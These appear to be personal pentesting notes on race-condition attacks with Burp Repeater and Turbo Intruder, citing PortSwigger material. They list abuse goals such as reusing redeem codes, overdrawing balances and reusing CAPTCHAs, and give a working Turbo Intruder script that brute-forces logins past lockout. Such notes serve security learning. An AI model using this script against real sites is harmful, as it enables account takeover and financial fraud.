### Submitting a form multiple times using Burp repeater
1. Create a group and duplicate tabs within it.
2. Click the drop-down arrow by the side of the Send button and select "Send group in parallel"
3. Click Send group. Repeater sends all of the requests from the grouped tabs.
### Things to do:
    Using a redeem code multiple times
    
    Rating a product multiple times
    
    Withdrawing or transferring cash in excess of your account balance
    
    Reusing a single CAPTCHA solution
  
### Bypassing Rate limiting using Turbo Intruder

Turbo Intruder is suited to more complex attacks, such as ones that require multiple retries, staggered request timing, or an extremely large number of requests.

### Probe for clues
1. Observe that after (x) number of concurent failed login attempts, you're temporarily locked out.

2. Send the group of requests again in parallel.

3. Study the responses. Notice that although you have triggered the account lock, more than (x) requests received the normal Invalid username and password response.

4. Infer that if you're quick enough, you're able to submit more than three login attempts before the account lock is triggered.

### Proof-of-concept
1. Highlight the part you wanna brute-force (password=%s)
2. Right-click and select Extensions > Turbo Intruder > Send to turbo intruder.
3. From the drop-down menu, select the examples/race-single-packet-attack.py template
4. In the Python editor, edit the template so that your attack queues the request once using each of the candidate passwords. For simplicity, you can copy the following example:

'''

    def queueRequests(target, wordlists):
    
        # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
        engine = RequestEngine(endpoint=target.endpoint,
                               concurrentConnections=1,
                               engine=Engine.BURP2
                               )
        
        # assign the list of candidate passwords from your clipboard
        passwords = wordlists.clipboard
        
        # queue a login request using each password from the wordlist
        # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
        for password in passwords:
            engine.queue(target.req, password, gate='1')
        
        # once every request has been queued
        # invoke engine.openGate() to send all requests in the given gate simultaneously
        engine.openGate('1')
    
    
    def handleResponse(req, interesting):
        table.add(req)
        
'''

# Refrences
https://portswigger.net/web-security/race-conditions

https://portswigger.net/research/the-single-packet-attack-making-remote-race-conditions-local

https://sakurity.com/blog/2015/05/21/starbucks.html

https://github.com/TheHackerDev/race-the-web
